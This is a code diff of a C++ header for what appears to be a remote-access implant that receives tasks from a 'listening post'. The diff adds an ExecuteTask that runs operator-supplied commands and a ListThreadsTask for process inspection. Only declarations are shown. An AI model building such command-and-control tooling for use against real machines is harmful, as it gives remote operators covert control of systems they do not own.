@@ -18,6 +18,8 @@ struct Configuration {
     const bool isRunning;
 };
 
+//write the constructor and then declare what the key is for the task
+//and what we write in the "AddTask" request
 struct PingTask{
     PingTask(const boost::uuids::uuid& id);
     //to identify the task 
@@ -39,11 +41,32 @@ struct ConfigureTask {
 private:
     std::function<void(const Configuration&)> setter;
     const double meanDwell;
-    const bool isRunnig;
+    const bool isRunning;
 };
 
+struct ExecuteTask{
+    ExecuteTask(const boost::uuids::uuid& id, std::string command);
+    constexpr static std::string_view key{"execute"};
+    [[nodiscard]] Result run() const;
+    const boost::uuids::uuid id;
+
+private:
+    const std::string command;
+};
+
+struct ListThreadsTask{
+    ListThreadsTask(const boost::uuids::uuid& id,std::string processId);
+    constexpr static std::string_view key {"list-threads"};
+    [[nodiscard]] Result run() const;
+    const boost::uuids::uuid id;
+
+private:
+    const std::string processId;
+};
+
+
 //responsible for parsing the tasks we receive from the listening post:
-using Task = std::variant<PingTask,ConfigureTask>;
+using Task = std::variant<PingTask,ConfigureTask, ExecuteTask, ListThreadsTask>;
 
 [[nodiscard]] Task parseTaskFrom(const boost::property_tree::ptree& taskTree,
     std::function<void(const Configuration&)> setter);
